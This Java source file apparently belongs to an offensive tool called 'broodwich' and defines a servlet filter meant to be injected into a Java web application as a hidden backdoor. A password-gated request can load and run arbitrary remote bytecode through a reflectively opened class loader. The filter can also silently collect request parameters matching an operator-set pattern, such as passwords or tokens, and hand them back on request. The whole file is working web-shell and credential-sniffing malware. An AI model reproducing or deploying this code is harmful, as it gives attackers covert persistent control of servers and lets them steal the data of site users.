/*
 * Copyright (c) 2019 Brian D. Hysell
 *
 * This Source Code Form is subject to the terms of the Mozilla Public
 * License, v. 2.0. If a copy of the MPL was not distributed with this
 * file, You can obtain one at http://mozilla.org/MPL/2.0/.
 */

package party.itistimeto.broodwich.droppers;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.regex.Pattern;
import java.util.zip.GZIPInputStream;

public class BroodwichFilter implements Filter {
    public static final String moduleIdKey = "broodwichModule";
    public static final String moduleParamsKey = "broodwichParams";
    public static final String passwordKey = "broodwichPassword";
    static final String filterName = "broodwich";
    public static final String setPatternModule = "party.itistimeto.broodwich.modules.setpattern";
    public static final String flushMatchesModule = "party.itistimeto.broodwich.modules.flushmatches";
    private ConcurrentLinkedQueue<String> sniffedData;
    private ConcurrentHashMap<String, Class> modules;
    private Pattern sniffPattern;
    private String password;

    public BroodwichFilter() {
        super();

        this.modules = new ConcurrentHashMap<String, Class>();
        this.sniffedData = new ConcurrentLinkedQueue<String>();
    }

    public BroodwichFilter(String password) {
        this();

        this.setPassword(password);
    }

    public void setPassword(String password) {
        this.password = password;
    }

    public static String encodeBase64(byte[] bytes) {
        try {
            return (String) Class.forName("javax.xml.bind.DatatypeConverter").getDeclaredMethod("printBase64Binary", byte[].class).invoke(null, (Object) bytes);
        } catch (Exception e) {
            // ...
        }

        try {
            return (String) Class.forName("java.util.Base64$Encoder").getDeclaredMethod("encodeToString", byte[].class).invoke(Class.forName("java.util.Base64").getDeclaredMethod("getEncoder").invoke(null), (Object) bytes);
        } catch (Exception e) {
            // ...
        }

        return "";
    }

    public static byte[] decodeBase64(String encodedBytes) {
        try {
            return (byte[]) Class.forName("javax.xml.bind.DatatypeConverter").getDeclaredMethod("parseBase64Binary", String.class).invoke(null, encodedBytes);
        } catch (Exception e) {
            // ...
        }

        try {
            return (byte[]) Class.forName("java.util.Base64$Decoder").getDeclaredMethod("decode", String.class).invoke(Class.forName("java.util.Base64").getDeclaredMethod("getDecoder").invoke(null), encodedBytes);
        } catch (Exception e) {
            // ...
        }

        return new byte[0];
    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
        // todo: check if this is ever actually called
    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        // todo: handle exceptions so we don't crash everything
        HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequest;
        Map<String, String[]> parameterMap = httpServletRequest.getParameterMap();
        PrintWriter pw = servletResponse.getWriter();
        if(parameterMap.containsKey(moduleIdKey) && parameterMap.containsKey(passwordKey) && parameterMap.get(passwordKey)[0].equals(this.password)) {
            String moduleId = httpServletRequest.getParameter(moduleIdKey);
            String[] moduleParams = parameterMap.get(moduleParamsKey);

            if(this.modules.containsKey(moduleId)) {
                try {
                    pw.println(this.modules.get(moduleId).getDeclaredMethod("run", List.class).invoke(null, moduleParams != null ? Arrays.asList(moduleParams) : new ArrayList<String>()));
                } catch (NoSuchMethodException e) {
                    e.printStackTrace();
                } catch (IllegalAccessException e) {
                    e.printStackTrace();
                } catch (InvocationTargetException e) {
                    e.printStackTrace();
                }
            }
            else if(moduleId.equals("party.itistimeto.broodwich.modules.load") && moduleParams.length == 2) {
                try {
                    InputStream gis = new GZIPInputStream(new ByteArrayInputStream(decodeBase64(moduleParams[1])));
                    ByteArrayOutputStream bos = new ByteArrayOutputStream();
                    byte[] buf = new byte[1024];
                    int n;
                    while((n = gis.read(buf)) > 0) {
                        bos.write(buf, 0, n);
                    }
                    byte[] bytecode = bos.toByteArray();

                    Class sclClazz = java.security.SecureClassLoader.class;
                    Constructor sclConstructor = sclClazz.getDeclaredConstructor(ClassLoader.class);
                    sclConstructor.setAccessible(true);
                    Method defineClass = sclClazz.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class, java.security.CodeSource.class);
                    defineClass.setAccessible(true);
                    this.modules.put(moduleParams[0], (Class) defineClass.invoke(sclConstructor.newInstance(this.getClass().getClassLoader()), moduleParams[0], bytecode, 0, bytecode.length, null));
                } catch (NoSuchMethodException e) {
                    e.printStackTrace();
                } catch (IllegalAccessException e) {
                    e.printStackTrace();
                } catch (InvocationTargetException e) {
                    e.printStackTrace();
                } catch (InstantiationException e) {
                    e.printStackTrace();
                }
            }
            else if(moduleId.equals(setPatternModule) && moduleParams.length == 1) {
                this.sniffPattern = Pattern.compile(moduleParams[0]);
            }
            else if(moduleId.equals(flushMatchesModule)) {
                for(int i = 0; i < 100 && !this.sniffedData.isEmpty(); i++) {
                    pw.println(this.sniffedData.poll());
                }
            }

            // set status header if on struts
            // todo: come up with alternative / modularize
            if(servletRequest.getClass().getName().equals("org.apache.struts2.dispatcher.StrutsRequestWrapper")) {
                ((HttpServletResponse) servletResponse).setHeader("X-Modified-By", "Broodwich");
            }
        }
        else if (this.sniffPattern != null) {
            for(String name : parameterMap.keySet()) {
                if(sniffPattern.matcher(name).matches()) {
                    sniffedData.addAll(Arrays.asList(parameterMap.get(name)));
                }
            }
        }
    }

    @Override
    public void destroy() {

    }
}